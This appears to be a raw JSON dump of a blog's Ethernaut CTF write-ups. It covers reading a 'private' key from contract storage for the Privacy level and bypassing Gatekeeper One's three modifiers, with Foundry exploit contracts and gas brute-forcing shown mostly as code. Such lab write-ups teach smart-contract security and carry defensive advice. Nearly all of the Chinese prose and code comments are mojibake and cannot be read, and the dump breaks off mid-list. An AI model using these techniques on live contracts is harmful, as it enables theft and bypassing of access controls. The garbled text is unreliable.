bytes</td>\n<td>åˆ†åˆ«æ˜¯1ä¸ªå­—èŠ‚+1ä¸ªå­—èŠ‚+2ä¸ªå­—èŠ‚ï¼ŒSolidityå°†å®ƒä»¬æ‰“åŒ…åˆ°ä¸€ä¸ªæ’æ§½ä¸­</td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>data[0]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td>é™æ€æ•°ç»„å¯åŠ¨ä¸€ä¸ªæ–°çš„å­˜å‚¨æ§½ï¼Œæ¯ä¸ª <code>bytes32</code> å…ƒç´ å ç”¨ä¸€ä¸ªå®Œæ•´çš„æ§½</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>data[1]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>data[2]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td><strong>è¿™ä¸ªæ§½ä½å°±æ˜¯ <code>data[2]</code></strong></td>\n</tr>\n</tbody></table>\n<p>é€šè¿‡è¿™ä¸ªè¯¦ç»†çš„å­˜å‚¨å¸ƒå±€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>data[2]</code> å­˜å‚¨åœ¨ slot 5 ä¸­ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/PrivacyFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PrivacyTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    PrivacyFactory privacyFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        privacyFactory = new PrivacyFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(privacyFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPrivacyExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        Privacy instance = Privacy(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»ï¼šè¯»å– slot 5 ä¸­çš„ data[2]</span><br><span class=\"line\">        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è½¬æ¢ä¸º bytes16 å¹¶è§£é”</span><br><span class=\"line\">        bytes16 key = bytes16(data2);</span><br><span class=\"line\">        instance.unlock(key);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤å…³å¡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // é¢å¤–æµ‹è¯•ï¼šéªŒè¯å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">    function testStorageLayout() public &#123;</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æŸ¥å„ä¸ª slot çš„å†…å®¹</span><br><span class=\"line\">        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked</span><br><span class=\"line\">        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID</span><br><span class=\"line\">        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables</span><br><span class=\"line\">        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]</span><br><span class=\"line\">        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]</span><br><span class=\"line\">        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Slot 0 (locked):&quot;, uint256(slot0));</span><br><span class=\"line\">        console.log(&quot;Slot 1 (ID):&quot;, uint256(slot1));</span><br><span class=\"line\">        console.log(&quot;Slot 2 (packed):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot2);</span><br><span class=\"line\">        console.log(&quot;Slot 3 (data[0]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot3);</span><br><span class=\"line\">        console.log(&quot;Slot 4 (data[1]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot4);</span><br><span class=\"line\">        console.log(&quot;Slot 5 (data[2]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot5);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ†æå­˜å‚¨å¸ƒå±€</strong>ï¼šç¡®å®š <code>data[2]</code> å­˜å‚¨åœ¨ slot 5</li>\n<li><strong>è¯»å–å­˜å‚¨</strong>ï¼šä½¿ç”¨ <code>vm.load()</code> è¯»å– slot 5 çš„æ•°æ®</li>\n<li><strong>æ•°æ®è½¬æ¢</strong>ï¼šå°† <code>bytes32</code> è½¬æ¢ä¸º <code>bytes16</code></li>\n<li><strong>è°ƒç”¨ unlock</strong>ï¼šä½¿ç”¨è½¬æ¢åçš„ key è§£é”åˆçº¦</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// è¯»å– slot 5 ä¸­çš„ data[2]</span><br><span class=\"line\">bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\"></span><br><span class=\"line\">// è½¬æ¢ä¸º bytes16</span><br><span class=\"line\">bytes16 key = bytes16(data2);  // å–å‰16ä¸ªå­—èŠ‚</span><br><span class=\"line\"></span><br><span class=\"line\">// è§£é”åˆçº¦</span><br><span class=\"line\">instance.unlock(key);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"><a href=\"#1-ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\" class=\"headerlink\" title=\"1. ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"></a>1. ä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šç§æœ‰æ•°æ®å­˜å‚¨åœ¨é“¾ä¸Š</span><br><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    bytes32[3] private secretData;  // ä»ç„¶å¯ä»¥è¢«è¯»å–ï¼</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">        require(_key == bytes16(secretData[2]));</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯</span><br><span class=\"line\">contract SecureContract &#123;</span><br><span class=\"line\">    bytes32 private dataHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _data) &#123;</span><br><span class=\"line\">        dataHash = keccak256(abi.encodePacked(_data));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes32 _data) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_data)) == dataHash);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\"><a href=\"#2-ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\" class=\"headerlink\" title=\"2. ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ\"></a>2. ä½¿ç”¨æ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitReveal &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    mapping(address =&gt; bool) private revealed;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ</span><br><span class=\"line\">    function commit(bytes32 _hashedData) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _hashedData;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯</span><br><span class=\"line\">    function reveal(bytes32 _data, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        revealed[msg.sender] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\"><a href=\"#å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\" class=\"headerlink\" title=\"å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·\"></a>å­˜å‚¨å¸ƒå±€åˆ†æå·¥å…·</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€</span></span><br><span class=\"line\">forge inspect &lt;ContractName&gt; storage-layout</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ cast è¯»å–å­˜å‚¨</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ web3.py è¯»å–å­˜å‚¨</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">data = w3.eth.get_storage_at(contract_address, 5)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ•°æ®ç±»å‹è½¬æ¢\"><a href=\"#æ•°æ®ç±»å‹è½¬æ¢\" class=\"headerlink\" title=\"æ•°æ®ç±»å‹è½¬æ¢\"></a>æ•°æ®ç±»å‹è½¬æ¢</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bytes32 åˆ° bytes16 è½¬æ¢</span><br><span class=\"line\">bytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;</span><br><span class=\"line\">bytes16 halfData = bytes16(fullData);  // å–å‰16ä¸ªå­—èŠ‚</span><br><span class=\"line\"></span><br><span class=\"line\">// æ•°æ®æ‰“åŒ…è§£æ</span><br><span class=\"line\">bytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;</span><br><span class=\"line\">uint8 flattening = uint8(packedData);           // æœ€å1å­—èŠ‚</span><br><span class=\"line\">uint8 denomination = uint8(packedData &gt;&gt; 8);    // å€’æ•°2å­—èŠ‚  </span><br><span class=\"line\">uint16 awkwardness = uint16(packedData &gt;&gt; 16);  // å€’æ•°3-4å­—èŠ‚</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åŒæ ·ï¼Œé“¾ä¸Šæ˜¯æ²¡æœ‰éšç§ã€‚ä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»</li>\n<li>åˆç†å®‰æ’ä½ çš„å­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥èŠ‚çœ gas</li>\n<li>EVM ä½¿ç”¨ 32 å­—èŠ‚çš„å­˜å‚¨æ§½ï¼Œå°äº 32 å­—èŠ‚çš„ç±»å‹ä¼šè¢«æ‰“åŒ…</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡å­˜å‚¨å¸ƒå±€åˆ†ææ‰¾åˆ°ç›®æ ‡æ•°æ®çš„ slot ä½ç½®</li>\n<li>ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®</li>\n<li>æ­£ç¡®å¤„ç†æ•°æ®ç±»å‹è½¬æ¢å’Œæ•°æ®æ‰“åŒ…</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®</li>\n<li>ä½¿ç”¨å“ˆå¸Œã€æ‰¿è¯ºæ–¹æ¡ˆæˆ–é“¾ä¸‹éªŒè¯</li>\n<li>è€ƒè™‘ä½¿ç”¨åŠ å¯†å­˜å‚¨è§£å†³æ–¹æ¡ˆ</li>\n<li>åˆç†è®¾è®¡å­˜å‚¨å¸ƒå±€ä»¥æé«˜æ•ˆç‡</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://solidity-by-example.org/hacks/accessing-private-data/\">Private data</a></li>\n<li><a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/\">EVM storage</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html\">Storage layout</a></li>\n</ul>\n"},{"title":"Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢","date":"2025-01-25T08:10:00.000Z","updated":"2025-01-25T08:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹ EVMä¸­çš„Gasè®¡ç®—ã€ç±»å‹è½¬æ¢å’Œtx.originçš„å·§å¦™è¿ç”¨ï¼ŒæŒæ¡Gatekeeper Oneå…³å¡çš„ç ´è§£æŠ€å·§ã€‚ç†è§£modifierçš„ç»•è¿‡æ–¹æ³•å’Œgasleft()çš„ç‰¹æ€§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 13 - Gatekeeper One](https://ethernaut.openzeppelin.com/level/13)  \n> **æ”»å‡»ç±»å‹**: Gasè®¡ç®— / ç±»å‹è½¬æ¢  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\né€šè¿‡ä¸‰ä¸ª `modifier` çš„æ£€æµ‹ï¼ŒæˆåŠŸè°ƒç”¨ `enter` å‡½æ•°ï¼Œæˆä¸º `entrant`ã€‚\n\n![Gatekeeper One Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ `enter(bytes8 _gateKey)` å‡½æ•°ï¼Œä½†å¿…é¡»ç»•è¿‡å®ƒçš„ä¸‰ä¸ª `modifier`ã€‚è®©æˆ‘ä»¬é€ä¸€åˆ†æã€‚\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` è¦æ±‚ `msg.sender` ä¸ç­‰äº `tx.origin`ã€‚è¿™æ˜¯ä¸€ç§å¸¸è§çš„æ£€æŸ¥ï¼Œç”¨äºé˜²æ­¢ç›´æ¥ä»å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰è°ƒç”¨ã€‚ä¸ºäº†ç»•è¿‡å®ƒï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ `enter` å‡½æ•°ã€‚è¿™æ ·ï¼Œ`tx.origin` å°†æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ï¼Œè€Œ `msg.sender` å°†æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ã€‚\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  require(gasleft() % 8191 == 0);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` è¦æ±‚åœ¨æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œå‰©ä½™çš„ `gas` å¿…é¡»æ˜¯ `8191` çš„å€æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„çº¦æŸï¼Œå› ä¸º `gas` çš„æ¶ˆè€—ä¼šå› æ“ä½œç ã€Solidityç‰ˆæœ¬å’Œä¼˜åŒ–å™¨è®¾ç½®è€Œå¼‚ã€‚\n\næœ€ç›´æ¥çš„æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›ç ´è§£ï¼šé€šè¿‡ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨è°ƒç”¨ `enter` å‡½æ•°æ—¶å°è¯•ä¸åŒçš„ `gas` å€¼ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³ `gasleft() % 8191 == 0` çš„å€¼ã€‚\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n  require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` å¯¹æˆ‘ä»¬ä¼ å…¥çš„ `_gateKey` (ä¸€ä¸ª `bytes8` ç±»å‹çš„å€¼) è¿›è¡Œäº†ä¸‰é¡¹æ£€æŸ¥ï¼š\n\n1.  `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`\n    *   `uint64(_gateKey)` å°† `bytes8` è½¬æ¢ä¸º `uint64`ã€‚\n    *   `uint32(...)` ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½32ä½ã€‚\n    *   `uint16(...)` ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½16ä½ã€‚\n    *   ä¸ºäº†è®©ä¸¤è€…ç›¸ç­‰ï¼Œ`_gateKey` çš„ç¬¬17ä½åˆ°ç¬¬32ä½å¿…é¡»å…¨ä¸º0ã€‚ä¾‹å¦‚ï¼Œ`0x????????0000????`ã€‚\n\n2.  `uint32(uint64(_gateKey)) != uint64(_gateKey)`\n    *   è¿™è¦æ±‚ `_gateKey` çš„é«˜32ä½ä¸å…¨ä¸º0ã€‚\n\n3.  `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`\n    *   `uint16(uint160(tx.origin))` è·å– `tx.origin` åœ°å€çš„æœ€ä½16ä½ã€‚\n    *   è¿™è¦æ±‚ `_gateKey` çš„ä½32ä½ï¼ˆç»è¿‡ç¬¬ä¸€æ¬¡æ£€æŸ¥åï¼Œå…¶å®å°±æ˜¯ä½16ä½ï¼‰å¿…é¡»ç­‰äº `tx.origin` çš„ä½16ä½ã€‚\n\nç»¼åˆè¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡º `_gateKey`ï¼š\n-   å°† `tx.origin` (å³æˆ‘ä»¬çš„EOAåœ°å€) çš„ä½16ä½ä½œä¸º `_gateKey` çš„ä½16ä½ã€‚\n-   ç¡®ä¿ `_gateKey` çš„17-32ä½ä¸º0ã€‚\n-   åœ¨ `_gateKey` çš„é«˜32ä½ä¸­è®¾ç½®è‡³å°‘ä¸€ä¸ªéé›¶ä½ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\nè¿™æ˜¯æˆ‘ä»¬çš„Foundryæµ‹è¯•åˆçº¦ï¼Œå®ƒå°†éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶è°ƒç”¨ `enter` å‡½æ•°ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/13_GatekeeperOne.sol\";\n\ncontract GatekeeperOneTest is Test {\n    GatekeeperOne instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperOne();\n        attacker = new Attack(address(instance));\n    }\n\n    function testattacker() public {\n        vm.startPrank(player1, player1);\n        // ä½¿ç”¨è¯•é”™æ³•æ‰¾åˆ°åˆé€‚çš„gaså€¼ (ä¾‹å¦‚ 268)\n        attacker.attack(268);\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\ncontract Attack is Test {\n    GatekeeperOne instance;\n\n    constructor(address fb) {\n        instance = GatekeeperOne(fb);\n    }\n\n    // æ„é€  gateKey å¹¶ä½¿ç”¨æŒ‡å®šçš„ gas è°ƒç”¨ enter å‡½æ•°\n    function attack(uint256 gas) public {\n        // æ„é€ æ»¡è¶³ gateThree çš„ key\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n\n        // ä½¿ç”¨è®¡ç®—å¥½çš„ gas è°ƒç”¨ç›®æ ‡å‡½æ•°\n        instance.enter{gas: 8191 * 10 + gas}(gateKey);\n    }\n\n    // ç”¨äºæš´åŠ›ç ´è§£ gas å€¼çš„å‡½æ•°\n    function findGas() public {\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n        \n        for (uint256 i = 0; i < 8191; i++) {\n            try instance.enter{gas: 8191 * 10 + i}(gateKey) {\n                console.log(\"Found gas:\", i); // å®éªŒå¾—å‡º i = 268\n                return;\n            } catch {}\n        }\n        revert(\"No gas match found!\");\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **åˆ›å»ºæ”»å‡»åˆçº¦**: ç»•è¿‡ `gateOne` (`msg.sender != tx.origin`)ã€‚\n2.  **æ„é€  `_gateKey`**:\n    *   è·å– `tx.origin` çš„ä½16ä½ã€‚\n    *   å°†å…¶æ„é€ æˆä¸€ä¸ª `bytes8` å€¼ï¼Œæ»¡è¶³ `gateThree` çš„æ‰€æœ‰ `require` æ¡ä»¶ã€‚\n3.  **æš´åŠ›ç ´è§£ `gas`**:\n    *   